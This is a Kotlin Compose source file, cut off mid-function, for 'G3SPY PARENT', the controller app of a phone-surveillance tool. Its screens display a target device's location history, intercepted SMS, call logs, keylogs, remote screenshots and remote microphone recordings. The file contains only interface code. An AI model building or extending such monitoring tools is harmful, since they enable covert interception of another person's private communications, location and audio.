package com.g3spy.parent

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.core.*
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.draw.blur
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.navigation.NavDestination.Companion.hierarchy
import androidx.navigation.NavGraph.Companion.findStartDestination
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.currentBackStackEntryAsState
import androidx.navigation.compose.rememberNavController
import com.g3spy.parent.model.*
import com.g3spy.parent.ui.theme.*
import com.g3spy.parent.viewmodel.MonitoringViewModel
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : ComponentActivity() {
    private lateinit var viewModel: MonitoringViewModel
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Initialize ViewModel
        viewModel = MonitoringViewModel()
        
        setContent {
            G3SPYTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    CyberpunkParentUI(viewModel)
                }
            }
        }
    }
}

// Main navigation items
sealed class Screen(val route: String, val icon: ImageVector, val label: String) {
    object Dashboard: Screen("dashboard", Icons.Default.Dashboard, "DASHBOARD")
    object Location: Screen("location", Icons.Default.LocationOn, "LOCATION")
    object Messages: Screen("messages", Icons.Default.Message, "MESSAGES")
    object Calls: Screen("calls", Icons.Default.Call, "CALLS")
    object Media: Screen("media", Icons.Default.Image, "MEDIA")
    object Settings: Screen("settings", Icons.Default.Settings, "SETTINGS")
}

// List of screens for bottom navigation
val screens = listOf(
    Screen.Dashboard,
    Screen.Location,
    Screen.Messages,
    Screen.Calls,
    Screen.Media,
    Screen.Settings
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun CyberpunkParentUI(viewModel: MonitoringViewModel) {
    val navController = rememberNavController()
    val coroutineScope = rememberCoroutineScope()
    
    // State for tracking whether to show the scanning animation
    var showScanning by remember { mutableStateOf(false) }
    
    // Pulse animation for cyberpunk effect
    val infinitePulse = rememberInfiniteTransition(label = "pulse")
    val pulseAlpha by infinitePulse.animateFloat(
        initialValue = 0.6f,
        targetValue = 1f,
        animationSpec = infiniteRepeatable(
            animation = tween(1000, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "pulse_alpha"
    )
    
    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text(
                            text = "G3SPY",
                            style = MaterialTheme.typography.displaySmall,
                            color = NeonBlue
                        )
                        Text(
                            text = "PARENT",
                            style = MaterialTheme.typography.displaySmall,
                            color = NeonPink,
                            modifier = Modifier.padding(start = 8.dp)
                        )
                        Spacer(modifier = Modifier.weight(1f))
                        
                        // Scan button with pulsing effect
                        IconButton(
                            onClick = {
                                showScanning = true
                                coroutineScope.launch {
                                    // Simulate scanning operation
                                    viewModel.refreshAllData()
                                    // Hide scanning animation after operation completes
                                    showScanning = false
                                }
                            },
                            modifier = Modifier.alpha(pulseAlpha)
                        ) {
                            Icon(
                                imageVector = Icons.Default.Refresh,
                                contentDescription = "Scan",
                                tint = NeonGreen
                            )
                        }
                    }
                },
                colors = androidx.compose.material3.TopAppBarDefaults.smallTopAppBarColors(
                    containerColor = CyberDarkSurface
                )
            )
        },
        bottomBar = {
            NavigationBar(
                containerColor = CyberDarkSurface,
                contentColor = NeonBlue
            ) {
                val navBackStackEntry by navController.currentBackStackEntryAsState()
                val currentDestination = navBackStackEntry?.destination
                
                screens.forEach { screen ->
                    NavigationBarItem(
                        icon = { 
                            Icon(
                                imageVector = screen.icon, 
                                contentDescription = screen.label
                            ) 
                        },
                        label = { 
                            Text(
                                text = screen.label,
                                style = MaterialTheme.typography.labelSmall
                            ) 
                        },
                        selected = currentDestination?.hierarchy?.any { it.route == screen.route } == true,
                        onClick = {
                            navController.navigate(screen.route) {
                                popUpTo(navController.graph.findStartDestination().id) {
                                    saveState = true
                                }
                                launchSingleTop = true
                                restoreState = true
                            }
                        },
                        colors = NavigationBarItemDefaults.colors(
                            selectedIconColor = NeonBlue,
                            selectedTextColor = NeonBlue,
                            indicatorColor = CyberDarkBgAlt,
                            unselectedIconColor = CyberTextSecondary,
                            unselectedTextColor = CyberTextSecondary
                        )
                    )
                }
            }
        }
    ) { paddingValues ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
                .background(
                    brush = Brush.verticalGradient(
                        colors = listOf(
                            CyberGradientStart,
                            CyberGradientMid,
                            CyberGradientEnd
                        )
                    )
                )
        ) {
            // Navigation content
            NavHost(
                navController = navController,
                startDestination = Screen.Dashboard.route,
                modifier = Modifier.fillMaxSize()
            ) {
                composable(Screen.Dashboard.route) {
                    DashboardScreen(viewModel)
                }
                composable(Screen.Location.route) {
                    LocationScreen(viewModel)
                }
                composable(Screen.Messages.route) {
                    MessagesScreen(viewModel)
                }
                composable(Screen.Calls.route) {
                    CallsScreen(viewModel)
                }
                composable(Screen.Media.route) {
                    MediaScreen(viewModel)
                }
                composable(Screen.Settings.route) {
                    SettingsScreen()
                }
            }
            
            // Scanning overlay animation
            AnimatedVisibility(
                visible = showScanning,
                enter = fadeIn(),
                exit = fadeOut()
            ) {
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .background(CyberDarkBg.copy(alpha = 0.8f))
                        .blur(4.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Column(
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        CircularProgressIndicator(
                            color = NeonBlue,
                            modifier = Modifier.size(60.dp)
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        Text(
                            text = "SCANNING CHILD DEVICE",
                            style = MaterialTheme.typography.titleMedium,
                            color = NeonBlue
                        )
                    }
                }
            }
        }
    }
}

@Composable
fun DashboardScreen(viewModel: MonitoringViewModel) {
    val keylogs by viewModel.keylogs.collectAsState()
    val locations by viewModel.locations.collectAsState()
    val calls by viewModel.calls.collectAsState()
    val messages by viewModel.messages.collectAsState()
    val screenshots by viewModel.screenshots.collectAsState()
    
    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        item {
            Text(
                text = "SYSTEM OVERVIEW",
                style = MaterialTheme.typography.titleLarge,
                color = NeonBlue,
                modifier = Modifier.padding(bottom = 8.dp)
            )
        }
        
        // Child device status card
        item {
            CyberpunkInfoCard(
                title = "CHILD DEVICE STATUS",
                iconColor = NeonGreen,
                gradientColors = listOf(NeonGreen.copy(alpha = 0.3f), Color.Transparent)
            ) {
                Column(modifier = Modifier.fillMaxWidth()) {
                    StatusItem(label = "Last Connection", value = "< 1 minute ago")
                    StatusItem(label = "Battery Level", value = "84%")
                    StatusItem(label = "Device Model", value = "Samsung Galaxy S21")
                    StatusItem(label = "Android Version", value = "15.0")
                }
            }
        }
        
        // Recent activities
        item {
            CyberpunkInfoCard(
                title = "RECENT ACTIVITIES",
                iconColor = NeonBlue,
                gradientColors = listOf(NeonBlue.copy(alpha = 0.3f), Color.Transparent)
            ) {
                Column(modifier = Modifier.fillMaxWidth()) {
                    // Display last location if available
                    if (locations.isNotEmpty()) {
                        val lastLocation = locations.maxByOrNull { it.timestamp }
                        if (lastLocation != null) {
                            ActivityItem(
                                icon = Icons.Default.LocationOn,
                                title = "Location",
                                description = "Lat: ${lastLocation.latitude}, Lng: ${lastLocation.longitude}",
                                timestamp = formatTimestamp(lastLocation.timestamp)
                            )
                        }
                    }
                    
                    // Display last message if available
                    if (messages.isNotEmpty()) {
                        val lastMessage = messages.maxByOrNull { it.timestamp }
                        if (lastMessage != null) {
                            ActivityItem(
                                icon = Icons.Default.Message,
                                title = lastMessage.sender,
                                description = lastMessage.content,
                                timestamp = formatTimestamp(lastMessage.timestamp)
                            )
                        }
                    }
                    
                    // Display last call if available
                    if (calls.isNotEmpty()) {
                        val lastCall = calls.maxByOrNull { it.timestamp }
                        if (lastCall != null) {
                            ActivityItem(
                                icon = Icons.Default.Call,
                                title = lastCall.contactName ?: lastCall.phoneNumber,
                                description = "${lastCall.callType}, Duration: ${lastCall.duration}s",
                                timestamp = formatTimestamp(lastCall.timestamp)
                            )
                        }
                    }
                }
            }
        }
        
        // Quick actions card
        item {
            CyberpunkInfoCard(
                title = "QUICK ACTIONS",
                iconColor = NeonPink,
                gradientColors = listOf(NeonPink.copy(alpha = 0.3f), Color.Transparent)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceEvenly
                ) {
                    ActionButton(
                        icon = Icons.Default.CameraAlt,
                        label = "Screenshot",
                        onClick = { viewModel.requestScreenshot() }
                    )
                    ActionButton(
                        icon = Icons.Default.Mic,
                        label = "Record",
                        onClick = { viewModel.requestAudioRecording() }
                    )
                    ActionButton(
                        icon = Icons.Default.MyLocation,
                        label = "Locate",
                        onClick = { viewModel.requestLocationUpdate() }
                    )
                }
            }
        }
    }
}

@Composable
fun LocationScreen(viewModel: MonitoringViewModel) {
    val locations by viewModel.locations.collectAsState()
    
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        Text(
            text = "LOCATION TRACKING",
            style = MaterialTheme.typography.titleLarge,
            color = NeonBlue,
            modifier = Modifier.padding(bottom = 16.dp)
        )
        
        // Last known location
        if (locations.isNotEmpty()) {
            val lastLocation = locations.maxByOrNull { it.timestamp }
            if (lastLocation != null) {
                CyberpunkInfoCard(
                    title = "CURRENT LOCATION",
                    iconColor = NeonGreen,
                    gradientColors = listOf(NeonGreen.copy(alpha = 0.3f), Color.Transparent)
                ) {
                    Column(modifier = Modifier.fillMaxWidth()) {
                        StatusItem(label = "Latitude", value = "${lastLocation.latitude}")
                        StatusItem(label = "Longitude", value = "${lastLocation.longitude}")
                        StatusItem(label = "Timestamp", value = formatTimestamp(lastLocation.timestamp))
                        StatusItem(label = "Accuracy", value = "${lastLocation.accuracy} meters")
                    }
                }
            }
        } else {
            CyberpunkInfoCard(
                title = "NO LOCATION DATA",
                iconColor = CyberError,
                gradientColors = listOf(CyberError.copy(alpha = 0.3f), Color.Transparent)
            ) {
                Text(
                    text = "No location data available. Request an update.",
                    style = MaterialTheme.typography.bodyMedium,
                    color = CyberTextPrimary,
                    modifier = Modifier.padding(vertical = 8.dp)
                )
                Button(
                    onClick = { viewModel.requestLocationUpdate() },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = NeonBlue
                    ),
                    modifier = Modifier.align(Alignment.CenterHorizontally)
                ) {
                    Icon(
                        imageVector = Icons.Default.Refresh,
                        contentDescription = "Refresh",
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(text = "UPDATE LOCATION")
                }
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        
        // Location history
        CyberpunkInfoCard(
            title = "LOCATION HISTORY",
            iconColor = NeonBlue,
            gradientColors = listOf(NeonBlue.copy(alpha = 0.3f), Color.Transparent)
        ) {
            if (locations.isNotEmpty()) {
                LazyColumn(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(300.dp)
                ) {
                    items(locations.sortedByDescending { it.timestamp }) { location ->
                        LocationHistoryItem(location)
                    }
                }
            } else {
                Text(
                    text = "No location history available.",
                    style = MaterialTheme.typography.bodyMedium,
                    color = CyberTextPrimary,
                    modifier = Modifier.padding(vertical = 8.dp)
                )
            }
        }
    }
}

@Composable
fun MessagesScreen(viewModel: MonitoringViewModel) {
    val messages by viewModel.messages.collectAsState()
    
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        Text(
            text = "SMS MESSAGES",
            style = MaterialTheme.typography.titleLarge,
            color = NeonBlue,
            modifier = Modifier.padding(bottom = 16.dp)
        )
        
        if (messages.isNotEmpty()) {
            LazyColumn(
                modifier = Modifier.fillMaxSize(),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                items(messages.sortedByDescending { it.timestamp }) { message ->
                    MessageItem(message)
                }
            }
        } else {
            CyberpunkInfoCard(
                title = "NO MESSAGE DATA",
                iconColor = CyberWarning,
                gradientColors = listOf(CyberWarning.copy(alpha = 0.3f), Color.Transparent)
            ) {
                Text(
                    text = "No SMS messages have been intercepted yet.",
                    style = MaterialTheme.typography.bodyMedium,
                    color = CyberTextPrimary,
                    modifier = Modifier.padding(vertical = 8.dp)
                )
                Button(
                    onClick = { viewModel.refreshAllData() },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = NeonBlue
                    ),
                    modifier = Modifier.align(Alignment.CenterHorizontally)
                ) {
                    Icon(
                        imageVector = Icons.Default.Refresh,
                        contentDescription = "Refresh",
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(text = "REFRESH DATA")
                }
            }
        }
    }
}

@Composable
fun CallsScreen(viewModel: MonitoringViewModel) {
    val calls by viewModel.calls.collectAsState()
    
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        Text(
            text = "CALL LOGS",
            style = MaterialTheme.typography.titleLarge,
            color = NeonBlue,
            modifier = Modifier.padding(bottom = 16.dp)
        )
        
        if (calls.isNotEmpty()) {
            LazyColumn(
                modifier = Modifier.fillMaxSize(),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                items(calls.sortedByDescending { it.timestamp }) { call ->
                    CallItem(call)
                }
            }
        } else {
            CyberpunkInfoCard(
                title = "NO CALL DATA",
                iconColor = CyberWarning,
                gradientColors = listOf(CyberWarning.copy(alpha = 0.3f), Color.Transparent)
            ) {
                Text(
                    text = "No call logs have been intercepted yet.",
                    style = MaterialTheme.typography.bodyMedium,
                    color = CyberTextPrimary,
                    modifier = Modifier.padding(vertical = 8.dp)
                )
                Button(
                    onClick = { viewModel.refreshAllData() },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = NeonBlue
                    ),
                    modifier = Modifier.align(Alignment.CenterHorizontally)
                ) {
                    Icon(
                        imageVector = Icons.Default.Refresh,
                        contentDescription = "Refresh",
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(text = "REFRESH DATA")
                }
            }
        }
    }
}

@Composable
fun MediaScreen(viewModel: MonitoringViewModel) {
    val screenshots by viewModel.screenshots.collectAsState()
    val audioRecordings by viewModel.audioRecordings.collectAsState()
    
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        Text(
            text = "MEDIA CAPTURES",
            style = MaterialTheme.typography.titleLarge,
            color = NeonBlue,
            modifier = Modifier.padding(bottom = 16.dp)
        )
        
        // Screenshots section
        Text(
            text = "SCREENSHOTS",
            style = MaterialTheme.typography.titleMedium,
            color = NeonGreen,
            modifier = Modifier.padding(bottom = 8.dp)
        )
        
        if (screenshots.isNotEmpty()) {
            // Display screenshots in grid
            LazyColumn(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(200.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                items(screenshots.sortedByDescending { it.timestamp }) { screenshot ->
                    ScreenshotItem(screenshot)
                }
            }
        } else {
            CyberpunkInfoCard(
                title = "NO SCREENSHOTS",
                iconColor = CyberInfo,
                gradientColors = listOf(CyberInfo.copy(alpha = 0.3f), Color.Transparent)
            ) {
                Text(
                    text = "No screenshots available. Capture one now.",
                    style = MaterialTheme.typography.bodyMedium,
                    color = CyberTextPrimary,
                    modifier = Modifier.padding(vertical = 8.dp)
                )
                Button(
                    onClick = { viewModel.requestScreenshot() },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = NeonBlue
                    ),
                    modifier = Modifier.align(Alignment.CenterHorizontally)
                ) {
                    Icon(
                        imageVector = Icons.Default.CameraAlt,
                        contentDescription = "Screenshot",
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(text = "CAPTURE SCREENSHOT")
                }
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        
        // Audio recordings section
        Text(
            text = "AUDIO RECORDINGS",
            style = MaterialTheme.typography.titleMedium,
            color = NeonPink,
            modifier = Modifier.padding(bottom = 8.dp)
        )
        
        if (audioRecordings.isNotEmpty()) {
            // Display audio recordings list
            LazyColumn(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(200.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                items(audioRecordings.sortedByDescending { it.timestamp }) { recording ->
                    AudioRecordingItem(recording)
                }
            }
        } else {
            CyberpunkInfoCard(
                title = "NO RECORDINGS",
                iconColor = CyberInfo,
                gradientColors = listOf(CyberInfo.copy(alpha = 0.3f), Color.Transparent)
            ) {
                Text(
                    text = "No audio recordings available. Record one now.",
                    style = MaterialTheme.typography.bodyMedium,
                    color = CyberTextPrimary,
                    modifier = Modifier.padding(vertical = 8.dp)
                )
                Button(
                    onClick = { viewModel.requestAudioRecording() },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = NeonPink
                    ),
                    modifier = Modifier.align(Alignment.CenterHorizontally)
                ) {
                    Icon(
                        imageVector = Icons.Default.Mic,
                        contentDescription = "Record",
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(text = "START RECORDING")
                }
            }
        }
    }
}

@Composable
fun SettingsScreen() {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        Text(
            text = "SETTINGS",
            style = MaterialTheme.typography.titleLarge,
            color = NeonBlue,
            modifier = Modifier.padding(bottom = 16.dp)
        )
        
        CyberpunkInfoCard(
            title = "MONITORING SETTINGS",
            iconColor = NeonBlue,
            gradientColors = listOf(NeonBlue.copy(alpha = 0.3f), Color.Transparent)
        ) {
            Column(modifier = Modifier.fillMaxWidth()) {
                SettingsSwitchItem(
                    label = "Location Tracking",
                    description = "Track child device location in real-time",
                    initialValue = true
                )
                
                SettingsSwitchItem(
                    label = "SMS Monitoring",
                    description = "Monitor incoming and outgoing SMS messages",
                    initialValue = true
                )
                
                SettingsSwitchItem(
                    label = "Call Log Monitoring",
                    description = "Track all incoming and outgoing calls",
                    initialValue = true
                )
                
                SettingsSwitchItem(
                    label = "Audio Recording",
                    description = "Enable remote microphone activation",
                    initialValue = true
                )
                
                SettingsSwitchItem(
                    label = "Screenshot Capture",
                    description = "Enable remote screen capture",
                    initialValue = true
                )
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        
        CyberpunkInfoCard(
            title = "NOTIFICATION SETTINGS",
            iconColor = NeonPink,
            gradientColors = listOf(NeonPink.copy(alpha = 0.3f), Color.Transparent)
        ) {
            Column(modifier = Modifier.fillMaxWidth()) {
                SettingsSwitchItem(
                    label = "Location Alerts",
                    description = "Get notified when child leaves designated area",
                    initialValue = true
                )
                
                SettingsSwitchItem(
                    label = "Suspicious Message Alerts",
                    description = "Notify on potentially suspicious messages",
                    initialValue = true
                )
                
                SettingsSwitchItem(
                    label = "Unknown Caller Alerts",
                    description = "Alert on calls from unknown numbers",
                    initialValue = true
                )
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        
        CyberpunkInfoCard(
            title = "SYSTEM SETTINGS",
            iconColor = NeonGreen,
            gradientColors = listOf(NeonGreen.copy(alpha = 0.3f), Color.Transparent)
        ) {
            Column(modifier = Modifier.fillMaxWidth()) {
                SettingsSliderItem(
                    label = "Data Refresh Rate",
                    description = "How often to check for new data (minutes)",
                    initialValue = 5f,
                    range = 1f..30f,
                    steps = 29
                )
                
                SettingsSliderItem(
                    label = "Storage Retention",
                    description = "How long to keep historic data (days)",
                    initialValue = 30f,
                    range = 1f..90f,
                    steps = 89
                )
            }
        }
    }
}

// Helper composables for screens

@Composable
fun CyberpunkInfoCard(
    title: String,
    iconColor: Color,
    gradientColors: List<Color>,
    content: @Composable ColumnScope.() -> Unit
) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .border(
                width = 1.dp,
                brush = Brush.horizontalGradient(
                    colors = listOf(iconColor, iconColor.copy(alpha = 0.3f))
                ),
                shape = RoundedCornerShape(8.dp)
            ),
        colors = CardDefaults.cardColors(
            containerColor = CyberDarkSurface.copy(alpha = 0.7f)
        ),
        shape = RoundedCornerShape(8.dp)
    ) {
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .background(
                    brush = Brush.horizontalGradient(colors = gradientColors)
                )
        ) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp)
            ) {
                Text(
                    text = title,
                    style = MaterialTheme.typography.titleMedium,
                    color = iconColor,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
                
                content()
            }
        }
    }
}

@Composable
fun StatusItem(label: String, value: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(
            text = label,
            style = MaterialTheme.typography.bodyMedium,
            color = CyberTextSecondary
        )
        Text(
            text = value,
            style = MaterialTheme.typography.bodyMedium,
            color = CyberTextPrimary
        )
    }
}

@Composable
fun ActivityItem(
    icon: ImageVector,
    title: String,
    description: String,
    timestamp: String
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 8.dp)
    ) {
        Icon(
            imageVector = icon,
            contentDescription = null,
            tint = NeonBlue,
            modifier = Modifier
                .padding(end = 12.dp)
                .align(Alignment.CenterVertically)
        )
        
        Column(modifier = Modifier.weight(1f)) {
            Text(
                text = title,
                style = MaterialTheme.typography.bodyLarge,
                color = CyberTextPrimary
            )
            Text(
                text = description,
                style = MaterialTheme.typography.bodyMedium,
                color = CyberTextSecondary,
                maxLines = 1,
                overflow = TextOverflow.Ellipsis
            )
        }
        
        Text(
            text = timestamp,
            style = MaterialTheme.typography.bodySmall,
            color = CyberTextSecondary,
            modifier = Modifier.align(Alignment.CenterVertically)
        )
    }
}

@Composable
fun ActionButton(
    icon: ImageVector,
    label: String,
    onClick: () -> Unit
) {
    Column(
        horizontalAlignment = Alignment.CenterHorizontally,
        modifier = Modifier
            .padding(8.dp)
            .clickable(onClick = onClick)
    ) {
        Box(
            modifier = Modifier
                .size(50.dp)
                .border(
                    width = 1.dp,
                    brush = Brush.horizontalGradient(
                        colors = listOf(NeonBlue, NeonPink)
                    ),
                    shape = RoundedCornerShape(8.dp)
                )
                .padding(1.dp)
                .background(
                    color = CyberDarkSurface.copy(alpha = 0.7f),
                    shape = RoundedCornerShape(8.dp)
                ),
            contentAlignment = Alignment.Center
        ) {
            Icon(
                imageVector = icon,
                contentDescription = label,
                tint = NeonBlue,
                modifier = Modifier.size(24.dp)
            )
        }
        
        Spacer(modifier = Modifier.height(4.dp))
        
        Text(
            text = label,
            style = MaterialTheme.typography.labelMedium,
            color = CyberTextPrimary,
            textAlign = TextAlign.Center
        )
    }
}

@Composable
fun LocationHistoryItem(location: LocationData) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        colors = CardDefaults.cardColors(
            containerColor = CyberDarkBgAlt.copy(alpha = 0.5f)
        )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                imageVector = Icons.Default.LocationOn,
                contentDescription = null,
                tint = NeonBlue,
                modifier = Modifier.padding(end = 12.dp)
            )
            
            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = "Lat: ${location.latitude}, Lng: ${location.longitude}",
                    style = MaterialTheme.typography.bodyMedium,
                    color = CyberTextPrimary
                )
                Text(
                    text = "Accuracy: ${location.accuracy} meters",
                    style = MaterialTheme.typography.bodySmall,
                    color = CyberTextSecondary
                )
            }
            
            Text(
                text = formatTimestamp(location.timestamp),
                style = MaterialTheme.typography.bodySmall,
                color = CyberTextSecondary
            )
        }
    }
}

@Composable
fun MessageItem(message: SmsData) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        colors = CardDefaults.cardColors(
            containerColor = CyberDarkBgAlt.copy(alpha = 0.5f)
        )
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Text(
                    text = message.sender,
                    style = MaterialTheme.typography.titleSmall,
                    color = NeonPink
                )
                Text(
                    text = formatTimestamp(message.timestamp),
                    style = MaterialTheme.typography.bodySmall,
                    color = CyberTextSecondary
                )
            }
            
            Spacer(modifier = Modifier.height(4.dp))
            
            Text(
                text = message.content,
                style = MaterialTheme.typography.bodyMedium,
                color = CyberTextPrimary,
                modifier = Modifier.padding(vertical = 4.dp)
            )
            
            Text(
                text = if (message.isIncoming) "INCOMING" else "OUTGOING",
                style = MaterialTheme.typography.labelSmall,
                color = if (message.isIncoming) NeonBlue else NeonGreen
            )
        }
    }
}

@Composable
fun CallItem(call: CallData) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        colors = CardDefaults.cardColors(
            containerColor = CyberDarkBgAlt.copy(alpha = 0.5f)
        )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                imageVector = when (call.callType) {
                    "INCOMING" -> Icons.Default.CallReceived
                    "OUTGOING" -> Icons.Default.CallMade
                    "MISSED" -> Icons.Default.CallMissed
                    else -> Icons.Default.Call
                },
                contentDescription = null,
                tint = when (call.callType) {
                    "INCOMING" -> NeonBlue
                    "OUTGOING" -> NeonGreen
                    "MISSED" -> CyberError
                    else -> CyberTextPrimary
                },
                modifier = Modifier.padding(end = 12.dp)
            )
            
            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = call.contactName ?: call.phoneNumber,
                    style = MaterialTheme.typography.titleSmall,
                    color = CyberTextPrimary
                )
                
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Text(
                        text = "${call.callType} (${call.duration}s)",
                        style = MaterialTheme.typography.bodySmall,
                        color = when (call.callType) {
                            "INCOMING" -> NeonBlue
                            "OUTGOING" -> NeonGreen
                            "MISSED" -> CyberError
                            else -> CyberTextSecondary
                        }
                    )
                    
                    Text(
                        text = formatTimestamp(call.timestamp),
                        style = MaterialTheme.typography.bodySmall,
                        color = CyberTextSecondary
                    )
                }
            }
        }
    }
}

@Composable
fun ScreenshotItem(screenshot: ScreenshotData) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        colors = CardDefaults.cardColors(
            containerColor = CyberDarkBgAlt.copy(alpha = 0.5f)
        )
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = Icons.Default.Image,
                        contentDescription = null,
                        tint = NeonGreen,
                        modifier = Modifier.padding(end = 8.dp)
                    )
                    Text(
                        text = "Screenshot",
                        style = MaterialTheme.typography.titleSmall,
                        color = CyberTextPrimary
                    )
                }
                
                Text(
                    text = formatTimestamp(screenshot.timestamp),
                    style = MaterialTheme.typography.bodySmall,
                    color = CyberTextSecondary
                )
            }
            
            Spacer(modifier = Modifier.height(8.dp))
            
            // Here we would display the actual screenshot if we had the image library
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(120.dp)
                    .background(CyberDarkSurface, RoundedCornerShape(4.dp))
                    .border(
                        width = 1.dp,
                        color = NeonGreen.copy(alpha = 0.5f),
                        shape = RoundedCornerShape(4.dp)
                    ),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    text = "SCREENSHOT ${screenshot.id}",
                    style = MaterialTheme.typography.bodyMedium,
                    color = CyberTextSecondary
                )
            }
        }
    }
}

@Composable
fun AudioRecordingItem(recording: AudioRecordingData) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        colors = CardDefaults.cardColors(
            containerColor = CyberDarkBgAlt.copy(alpha = 0.5f)
        )
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = Icons.Default.Mic,
                        contentDescription = null,
                        tint = NeonPink,
                        modifier = Modifier.padding(end = 8.dp)
                    )
                    Text(
                        text = "Audio Recording",
                        style = MaterialTheme.typography.titleSmall,
                        color = CyberTextPrimary
                    )
                }
                
                Text(
